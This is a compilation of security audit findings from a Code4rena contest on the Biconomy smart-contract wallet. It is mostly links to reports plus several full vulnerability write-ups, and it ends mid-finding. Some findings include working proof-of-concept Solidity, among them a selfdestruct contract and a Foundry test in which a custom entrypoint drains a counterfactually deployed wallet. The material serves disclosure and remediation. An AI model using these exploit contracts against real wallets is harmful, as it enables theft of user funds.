See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/adriro-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/giovannidisiena-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/giovannidisiena-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/lukris02-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/juancito-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/pauliax-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Rageur-G.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L60-L68 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L319-L329 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L60-L68   # Vulnerability details  ## Impact  Some parts of the codebase are not compliant with the EIP-4337 from the [EIP-4337 specifications](https://eips.ethereum.org/EIPS/eip-4337#specification), at multiple degrees of severity.  ## Proof of Concept  ### Sender existence  ```text Create the account if it does not yet exist, using the initcode provided in the UserOperation. If the account does not exist, and the initcode is empty, or does not deploy a contract at the “sender” address, the call must fail. ```  If we take a look at the [`_createSenderIfNeeded()`]() function, we can see that it's not properly implemented: ```solidity function _createSenderIfNeeded(uint256 opIndex, UserOpInfo memory opInfo, bytes calldata initCode) internal {  if (initCode.length != 0) {   address sender = opInfo.mUserOp.sender;      if (sender.code.length != 0) revert FailedOp(opIndex, address(0), "AA10 sender already constructed");        address sender1 = senderCreator.createSender{gas: opInfo.mUserOp.verificationGasLimit}(initCode);         if (sender1 == address(0)) revert FailedOp(opIndex, address(0), "AA13 initCode failed or OOG");         if (sender1 != sender) revert FailedOp(opIndex, address(0), "AA14 initCode must return sender");         if (sender1.code.length == 0) revert FailedOp(opIndex, address(0), "AA15 initCode must create sender");         address factory = address(bytes20(initCode[0:20]));        emit AccountDeployed(opInfo.userOpHash, sender, factory, opInfo.mUserOp.paymaster);  } } ```  The statement in the EIP implies that if the account does not exist, the initcode **must** be used. In this case, it first check if the initcode exists, but this condition should be checked later.  This could be rewritten to:  ```solidity function _createSenderIfNeeded(uint256 opIndex, UserOpInfo memory opInfo, bytes calldata initCode) internal {  address sender = opInfo.mUserOp.sender;  if (sender.code.length == 0) {   require(initCode.length != 0, "empty initcode");   address sender1 = senderCreator.createSender{gas: opInfo.mUserOp.verificationGasLimit}(initCode);         if (sender1 == address(0)) revert FailedOp(opIndex, address(0), "AA13 initCode failed or OOG");         if (sender1 != sender) revert FailedOp(opIndex, address(0), "AA14 initCode must return sender");         if (sender1.code.length == 0) revert FailedOp(opIndex, address(0), "AA15 initCode must create sender");         address factory = address(bytes20(initCode[0:20]));        emit AccountDeployed(opInfo.userOpHash, sender, factory, opInfo.mUserOp.paymaster);  } } ```  ### Account  The third specification of the [`validateUserOp()`](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L60-L68) is the following:  ```text If the account does not support signature aggregation, it MUST validate the signature is a valid signature of the userOpHash, and SHOULD return SIG_VALIDATION_FAILED (and not revert) on signature mismatch. Any other error should revert. ```  This is currently not the case, as the case when the account does not support signature aggregation is not supported right now in the code. The `validateUserOp()` [reverts everytime](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L319-L329) if the recovered signature does not match.  Additionally, the `validateUserOp()` should return a time range, as per the EIP specifications:  ```text The return value is packed of sigFailure, validUntil and validAfter timestamps.   - sigFailure is 1 byte value of “1” the signature check failed (should not revert on signature failure, to support estimate)   - validUntil is 8-byte timestamp value, or zero for “infinite”. The UserOp is valid only up to this time.   - validAfter is 8-byte timestamp. The UserOp is valid only after this time. ```  This isn't the case. It just returns a signature deadline validity, which would probably be here the `validUntil` value.  ### Aggregator  This part deals with the aggregator interfacing:  ```text validateUserOp() (inherited from IAccount interface) MUST verify the aggregator parameter is valid and the same as getAggregator  ...  The account should also support aggregator-specific getter (e.g. getAggregationInfo()). This method should export the account’s public-key to the aggregator, and possibly more info (note that it is not called directly by the entryPoint)  ...  If an account uses an aggregator (returns it with getAggregator()), then its address is returned by simulateValidation() reverting with ValidationResultWithAggregator instead of ValidationResult ```  This aggregator address validation is not [done](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/BaseSmartAccount.sol#L60-L68).  ## Tools Used  Manual inspection  ## Recommended Mitigation Steps  Refactor the code that is not compliant with the EIP
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L166 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L192 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L229 https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/base/Executor.sol#L23   # Vulnerability details  ## Description  If the `SmartAccount` implementation contract is not initialized, it can be destroyed using the following attack scenario:  - Initialize the `SmartAccount` **implementation** contract using the `init` function. - Execute a transaction that contains a single `delegatecall` to a contract that executes the `selfdestruct` opcode on any incoming call, such as:  ```solidity= contract Destructor {     fallback() external {         selfdestruct(payable(0));     } } ```  The destruction of the implementation contract would result in the freezing of all functionality of the wallets that point to such an implementation. It would also be impossible to change the implementation address, as the `Singleton` functionality and the entire contract would be destroyed, leaving only the functionality from the Proxy contract accessible.  ---  In the deploy script there is the following logic:  ```typescript const SmartWallet = await ethers.getContractFactory("SmartAccount"); const baseImpl = await SmartWallet.deploy(); await baseImpl.deployed(); console.log("base wallet impl deployed at: ", baseImpl.address); ```  So, in the deploy script there is no enforce that the `SmartAccount` contract implementation was initialized.  The same situation in `scw-contracts/scripts/wallet-factory.deploy.ts` script.  ---  Please note, that in case only the possibility of initialization of the `SmartAccount` implementation will be banned it will be possible to use this attack. This is so because in such a case `owner` variable will be equal to zero and it will be easy to pass a check inside of `checkSignatures` function using the fact that for incorrect input parameters `ecrecover` returns a zero address.  ## Impact  Complete freezing of all functionality of all wallets (including complete funds freezing).  ## Recommended Mitigation Steps  Add to the deploy script initialization of the `SmartAccount` implementation, or add to the `SmartAccount` contract the following constructor that will prevent implementation contract from the initialization:  ```solidity= // Constructor ensures that this implementation contract can not be initialized constructor() public {     owner = address(1); } ```
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L200 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L239 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L248   # Vulnerability details  ## Description  The `execTransaction` function is designed to accept a relayed transaction with a transaction cost refund. At the beginning of the function, the `startGas` value is calculated as the amount of gas that the relayer will approximately spend on the transaction initialization, including the base cost of `21000` gas and the cost per calldata byte of `msg.data.length * 8` gas. At the end of the function, the total consumed gas is calculated as `gasleft() - startGas` and the appropriate refund is sent to the relayer.  An attacker could manipulate the calldata to increase the refund amount while spending less gas than what is calculated by the contract. To do this, the attacker could provide calldata with zero padded bytes of arbitrary length. This would only cost 4 gas per zero byte, but the refund would be calculated as 8 gas per calldata byte. As a result, the refund amount would be higher than the gas amount spent by the relayer.  ### Attack scenario  Let’s a smart wallet user signs a transaction. Some of the relayers trying to execute this transaction and send a transaction to the `SmartAccount` contract. Then, an attacker can frontrun the transaction, changing the transaction calldata by adding the zeroes bytes at the end.  So, the original transaction has such calldata:  ```sol= abi.encodeWithSignature(RelayerManager.execute.selector, (...)) ```  The modified (frontrun) transaction calldata:  ```sol= // Basically, just add zero bytes at the end abi.encodeWithSignature(RelayerManager.execute.selector, (...)) || 0x00[] ```  ### PoC  The PoC shows that the function may accept the data with redundant zeroes at the end. At the code above, an attacker send a 100_000 meaningless zeroes bytes, that gives a `100_000 * 4 = 400_000` additional gas refund. Technically, it is possible to pass even more zero bytes.  ```solidity= pragma solidity ^0.8.12;  contract DummySmartWallet {     function execTransaction(         Transaction memory _tx,         uint256 batchId,         FeeRefund memory refundInfo,         bytes memory signatures     ) external {         // Do nothing, just test that data with appended zero bytes are accepted by Solidity     } }  contract PoC {     address immutable smartWallet;      constructor() {         smartWallet = address(new DummySmartWallet());     }      // Successfully call with original data     function testWithOriginalData() external {         bytes memory txCalldata = _getOriginalTxCalldata();          (bool success, ) = smartWallet.call(txCalldata);         require(success);     }      // Successfully call with original data + padded zero bytes     function testWithModifiedData() external {         bytes memory originalTxCalldata = _getOriginalTxCalldata();         bytes memory zeroBytes = new bytes(100000);          bytes memory txCalldata = abi.encodePacked(originalTxCalldata, zeroBytes);          (bool success, ) = smartWallet.call(txCalldata);         require(success);     }      function _getOriginalTxCalldata() internal pure returns(bytes memory) {         Transaction memory transaction;         FeeRefund memory refundInfo;         bytes memory signatures;         return abi.encodeWithSelector(DummySmartWallet.execTransaction.selector, transaction, uint256(0), refundInfo, signatures);     } } ```  ## Impact  An attacker to manipulate the gas refund amount to be higher than the gas amount spent, potentially leading to arbitrary big ether loses by a smart wallet.  ## Recommended Mitigation Steps  You can calculate the number of bytes used by the relayer as a sum per input parameter. Then an attacker won't have the advantage of providing non-standard ABI encoding for the PoC calldata.   ``` // Sum the length of each  bynamic and static length parameters. uint256 expectedNumberOfBytes = _tx.data.length + signatures.length + 12 * 32; uint256 dataLen = Math.min(msg.data.length, expectedNumberOfBytes); ```  Please note, the length of the `signature` must also be bounded to eliminate the possibility to put meaningless zeroes there.
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L90   # Vulnerability details  # Cross-Chain Signature Replay Attack  ## Impact User operations can be replayed on smart accounts accross different chains. This can lead to user's loosing funds or any unexpected behaviour that transaction replay attacks usually lead to.  ## Proof of Concept As specified by the [EIP4337](https://eips.ethereum.org/EIPS/eip-4337) standard `to prevent replay attacks ... the signature should depend on chainid`. In [VerifyingSingletonPaymaster.sol#getHash](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L90) the chainId is missing which means that the same UserOperation can be replayed on a different chain for the same smart contract account if the `verifyingSigner` is the same (and most likely this will be the case).  ## Tools Used Manual review  ## Recommended Mitigation Steps Add the chainId in the calculation of the UserOperation hash in [VerifyingSingletonPaymaster.sol#getHash](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L90)  ```     function getHash(UserOperation calldata userOp)     public view returns (bytes32) { // @audit change to view         //can't use userOp.hash(), since it contains also the paymasterAndData itself.         return keccak256(abi.encode(                 userOp.getSender(),                 userOp.nonce,                 keccak256(userOp.initCode),                 keccak256(userOp.callData),                 userOp.callGasLimit,                 userOp.verificationGasLimit,                 userOp.preVerificationGas,                 userOp.maxFeePerGas,                 userOp.maxPriorityFeePerGas   block.chainid // @audit add chain id             ));     } ```
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0x1f8b-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L33-L45   # Vulnerability details  A counterfactual wallet can be used by pre-generating its address using the `SmartAccountFactory.getAddressForCounterfactualWallet` function. This address can then be securely used (for example, sending funds to this address) knowing in advance that the user will later be able to deploy it at the same address to gain control.  However, an attacker can deploy the counterfactual wallet on behalf of the owner and use an arbitrary entrypoint:  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccountFactory.sol#L33-L45  ```solidity function deployCounterFactualWallet(address _owner, address _entryPoint, address _handler, uint _index) public returns(address proxy){     bytes32 salt = keccak256(abi.encodePacked(_owner, address(uint160(_index))));     bytes memory deploymentData = abi.encodePacked(type(Proxy).creationCode, uint(uint160(_defaultImpl)));     // solhint-disable-next-line no-inline-assembly     assembly {         proxy := create2(0x0, add(0x20, deploymentData), mload(deploymentData), salt)     }     require(address(proxy) != address(0), "Create2 call failed");     // EOA + Version tracking     emit SmartAccountCreated(proxy,_defaultImpl,_owner, VERSION, _index);     BaseSmartAccount(proxy).init(_owner, _entryPoint, _handler);     isAccountExist[proxy] = true; } ```  As the entrypoint address doesn't take any role in the address generation (it isn't part of the salt or the init hash), then the attacker is able to use any arbitrary entrypoint while keeping the address the same as the pre-generated address.  ## Impact  After the attacker has deployed the wallet with its own entrypoint, this contract can be used to execute any arbitrary call or code (using `delegatecall`) using the `execFromEntryPoint` function:  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L489-L492  ```solidity function execFromEntryPoint(address dest, uint value, bytes calldata func, Enum.Operation operation, uint256 gasLimit) external onlyEntryPoint returns (bool success) {             success = execute(dest, value, func, operation, gasLimit);     require(success, "Userop Failed"); } ```  This means the attacker has total control over the wallet, it can be used to steal any pre-existing funds in the wallet, change the owner, etc.  ## PoC  In the following test, the attacker deploys the counterfactual wallet using the `StealEntryPoint` contract as the entrypoint, which is then used to steal any funds present in the wallet.  ```solidity contract StealEntryPoint {     function steal(SmartAccount wallet) public {         uint256 balance = address(wallet).balance;          wallet.execFromEntryPoint(             msg.sender, // address dest             balance, // uint value             "", // bytes calldata func             Enum.Operation.Call, // Enum.Operation operation             gasleft() // uint256 gasLimit         );     } }  contract AuditTest is Test {     bytes32 internal constant ACCOUNT_TX_TYPEHASH = 0xc2595443c361a1f264c73470b9410fd67ac953ebd1a3ae63a2f514f3f014cf07;      uint256 bobPrivateKey = 0x123;     uint256 attackerPrivateKey = 0x456;      address deployer;     address bob;     address attacker;     address entrypoint;     address handler;      SmartAccount public implementation;     SmartAccountFactory public factory;     MockToken public token;      function setUp() public {         deployer = makeAddr("deployer");         bob = vm.addr(bobPrivateKey);         attacker = vm.addr(attackerPrivateKey);         entrypoint = makeAddr("entrypoint");         handler = makeAddr("handler");          vm.label(deployer, "deployer");         vm.label(bob, "bob");         vm.label(attacker, "attacker");          vm.startPrank(deployer);         implementation = new SmartAccount();         factory = new SmartAccountFactory(address(implementation));         token = new MockToken();         vm.stopPrank();     }          function test_SmartAccountFactory_StealCounterfactualWallet() public {         uint256 index = 0;         address counterfactualWallet = factory.getAddressForCounterfactualWallet(bob, index);         // Simulate Bob sends 1 ETH to the wallet         uint256 amount = 1 ether;         vm.deal(counterfactualWallet, amount);          // Attacker deploys counterfactual wallet with a custom entrypoint (StealEntryPoint)         vm.startPrank(attacker);          StealEntryPoint stealer = new StealEntryPoint();          address proxy = factory.deployCounterFactualWallet(bob, address(stealer), handler, index);         SmartAccount wallet = SmartAccount(payable(proxy));          // address is the same         assertEq(address(wallet), counterfactualWallet);          // trigger attack         stealer.steal(wallet);          vm.stopPrank();          // Attacker has stolen the funds         assertEq(address(wallet).balance, 0);         assertEq(attacker.balance, amount);     } } ```  ## Recommendation  This may need further discussion, but an easy fix would be to include the entrypoint as part of the salt. Note that the entrypoint used to generate the address must be kept the same and be used during the deployment of the counterfactual wallet.
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/joestakey-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Aymen0909-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0x1f8b-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/betweenETHlines-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/lukris02-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Secureverse-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xSmartContract-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Udsen-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Kalzak-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Josiah-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Viktor_Cortess-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L460-L461 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L465-L466   # Vulnerability details  ## Description `execute` and `executeBatch` in `SmartAccount.sol` can only be called by owner, not EntryPoint:  ```javascript File: SmartAccount.sol  460:    function execute(address dest, uint value, bytes calldata func) external onlyOwner{ 461:        _requireFromEntryPointOrOwner(); 462:        _call(dest, value, func); 463:    } 464: 465:    function executeBatch(address[] calldata dest, bytes[] calldata func) external onlyOwner{ 466:        _requireFromEntryPointOrOwner(); 467:        require(dest.length == func.length, "wrong array lengths"); 468:        for (uint i = 0; i < dest.length;) { 469:            _call(dest[i], 0, func[i]); 470:            unchecked { 471:                ++i; 472:            } 473:        } 474:    } ```  From [EIP-4337](https://eips.ethereum.org/EIPS/eip-4337):  > - **Call the account with the `UserOperation`’s calldata.** It’s up to the account to choose how to parse the calldata; an expected workflow is for the account to have an execute function that parses the remaining calldata as a series of one or more calls that the account should make.  ## Impact This breaks the interaction with EntryPoint  ## Proof of Concept The reference implementation has both these functions without any onlyOwner modifiers:  https://github.com/eth-infinitism/account-abstraction/blob/develop/contracts/samples/SimpleAccount.sol#L56-L73 ```javascript 56:    /** 57:     * execute a transaction (called directly from owner, not by entryPoint) 58:     */ 59:    function execute(address dest, uint256 value, bytes calldata func) external { 60:        _requireFromEntryPointOrOwner(); 61:        _call(dest, value, func); 62:    } 63: 64:    /** 65:     * execute a sequence of transaction 66:     */ 67:    function executeBatch(address[] calldata dest, bytes[] calldata func) external { 68:        _requireFromEntryPointOrOwner(); 69:        require(dest.length == func.length, "wrong array lengths"); 70:        for (uint256 i = 0; i < dest.length; i++) { 71:            _call(dest[i], 0, func[i]); 72:        } 73:    } ```  ## Tools Used vscode  ## Recommended Mitigation Steps Remove `onlyOwner` modifier from `execute` and `executeBatch`
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/peanuts-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Rickard-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/gz627-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/gz627-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/IllIllI-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/IllIllI-G.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L77-L91   # Vulnerability details  ## Impact Detailed description of the impact of this finding.  ## Proof of Concept  for example, biconomy's wallet policy is - 1 eth for each wallet daily  and attacker does this - create userOp that spends 1 eth for gas - biconomy signs for that tx - attacker does not broadcast the tx and just withholds the signature - attacker creates another tx that spends 1 eth for gas - biconomy does check mainnet and finds out attack haven't spend any gas today so signs the tx - attacker broadcasts both tx(first one and the second one) - attacker spends 2 eth for gas in 1day  ## Tools Used  Contacting livingrock through discord  ## Recommended Mitigation Steps  use nonce per user in paymaster and use that to encode hash ``` contract VerifyingSingletonPaymaster is BasePaymaster {      using ECDSA for bytes32;     // possibly //  using Signatures for UserOperation;     using UserOperationLib for UserOperation;     using PaymasterHelpers for UserOperation;     using PaymasterHelpers for bytes;     using PaymasterHelpers for PaymasterData;      mapping(address => uint256) public paymasterIdBalances;     mapping(address => uint256) public senderNonce;     ...     function getHash(UserOperation calldata userOp)     public pure returns (bytes32) {         //can't use userOp.hash(), since it contains also the paymasterAndData itself.         address sender = userOp.getSender();         return keccak256(abi.encode(                 sender,                 userOp.nonce,                 keccak256(userOp.initCode),                 keccak256(userOp.callData),                 userOp.callGasLimit,                 userOp.verificationGasLimit,                 userOp.preVerificationGas,                 userOp.maxFeePerGas,                 userOp.maxPriorityFeePerGas,                 senderNonce[sender]             ));     } ``` 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/cryptostellar5-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Lirios-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/cthulhu_cult-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Diana-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L68-L86 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L168-L190   # Vulnerability details  ## Impact An attacker (e.g. a malicious bundler) could submit a bundle of high gas usage user operations with insufficient gas value, causing the bundle to fail even when the users calculated the gas limits correctly. This will result in a DoS for the user and the user/paymaster still have to pay for the execution, potentially draining their funds. This attack is possible as user operations are included by bundlers from the UserOperation mempool into the Ethereum block (see post on ERC-4337 https://medium.com/infinitism/erc-4337-account-abstraction-without-ethereum-protocol-changes-d75c9d94dc4a).  Reference for this issue: https://github.com/eth-infinitism/account-abstraction/commit/4fef857019dc2efbc415ac9fc549b222b07131ef  ## Proof of Concept In innerHandleOp(), a call was made to handle the operation with the specified mUserOp.callGasLimit. However, a malicious bundler could call the innerHandleOp() via handleOps() with a gas value that is insufficient for the transactions, resulting in the call to fail.   The remaining gas amount (e.g. gasLeft()) at this point was not verified to ensure that it is more than enough to fulfill the specified mUserOp.callGasLimit for the user operation. Even though the operation failed, the user/payment will still pay for the transactions due to the post operation logic.   https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L176   (bool success,bytes memory result) = address(mUserOp.sender).call{gas : mUserOp.callGasLimit}(callData);  ## Tools Used  ## Recommended Mitigation Steps Update the Account Abstraction implementation to the latest version. This will update the innerHandleOp() to verify that remaining gas is more than sufficient to cover the specified mUserOp.callGasLimit and mUserOp.verificationGasLimit.   Reference: https://github.com/eth-infinitism/account-abstraction/commit/4fef857019dc2efbc415ac9fc549b222b07131ef
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Atarpara-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/horsefacts-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol#L6 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol#L19 https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342   # Vulnerability details  ## Impact  As Per [EIP-1271](https://eips.ethereum.org/EIPS/eip-1271) standard `ERC1271_MAGIC_VAULE` should be `0x1626ba7e` instead of `0x20c13b0b` and function name should be `isValidSignature(bytes32,bytes)` instead of  `isValidSignature(bytes,bytes)`. Due to this, signature verifier contract go fallback function and return unexpected value and never return `ERC1271_MAGIC_VALUE` and always revert `execTransaction` function.   ## Proof of Concept  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol#L6  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/interfaces/ISignatureValidator.sol#L19  https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L342   ## Tools Used Manual Review  ## Recommended Mitigation Steps Follow [EIP-1271](https://eips.ethereum.org/EIPS/eip-1271) standard. 
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/shark-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/ast3ros-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/MyFDsYours-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/0xAgro-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/2997ms-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/SaharDevep-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Rolezn-G.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/Rolezn-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L216   # Vulnerability details  ## Impact  The protocol supports 2D nonces through a `batchId` mechanism.  Due to different ways to execute transaction on the wallet there could be a collision between `batchIds` being used.  This can result in unexpected failing of transactions  ## Proof of Concept  There are two main ways to execute transaction from the smart wallet  1. Via EntryPoint - calls `execFromEntryPoint`/`execute` 2. Via `execTransaction`  `SmartAccount` has locked the `batchId` #0  to be used by the `EntryPoint`. When an `EntryPoint` calls `validateUserOp` before execution, the hardcoded nonce of `batchId` #0 will be incremented and validated, https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L501 ```     // @notice Nonce space is locked to 0 for AA transactions     // userOp could have batchId as well     function _validateAndUpdateNonce(UserOperation calldata userOp) internal override {         require(nonces[0]++ == userOp.nonce, "account: invalid nonce");     } ```  Calls to `execTransaction` are more immediate and are likely to be executed before a `UserOp` through `EntryPoint`. There is no limitation in `execTransaction` to use `batchId` #0 although it should be called only by `EntryPoint`.  If there is a call to `execTransaction` with `batchId` set to `0`. It will increment the nonce and `EntryPoint` transactions will revert. https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L216 ```     function execTransaction(         Transaction memory _tx,         uint256 batchId,         FeeRefund memory refundInfo,         bytes memory signatures     ) public payable virtual override returns (bool success) { -------             nonces[batchId]++; -------         }     } ```  ## Tools Used  VS Code  ## Recommended Mitigation Steps  Add a requirement that `batchId` is not `0` in `execTransaction`:  `require(batchId != 0, "batchId 0 is used only by EntryPoint")`
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/zaskoh-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/hl_-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/sorrynotsorry-Q.md).
See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-01-biconomy-findings/blob/main/data/MalfurionWhitehat-Q.md).
# Lines of code  https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol#L97-L111   # Vulnerability details  ## Impact Openzeppelin canceled support for compact signatures in the ECDSA library after version 4.7.3, that is, it no longer supports recovery of signatures with a length of 64 ```  ## 4.7.3  ### Breaking changes   * `ECDSA`: `recover(bytes32,bytes)` and `tryRecover(bytes32,bytes)` no longer accept compact signatures to prevent malleability. Compact signature support remains available using `recover(bytes32,bytes32,bytes32)` and `tryRecover(bytes32,bytes32,bytes32)`.  ``` And biconomy uses the openzeppelin library above version 4.7.3  ```json     "@openzeppelin/contracts": "^4.7.3",     "@openzeppelin/contracts-upgradeable": "^4.7.3", ``` In the VerifyingSingletonPaymaster.validatePaymasterUserOp function, the code indicates that the signature with a length of 64 is still supported, but actually when the user uses a signature with a length of 64 in EntryPoint.handleOps, recover will return 0 address, the require statement fails, and validatePaymasterUserOp cannot work. ```solidity     function validatePaymasterUserOp(UserOperation calldata userOp, bytes32 /*userOpHash*/, uint256 requiredPreFund)     external view override returns (bytes memory context, uint256 deadline) {         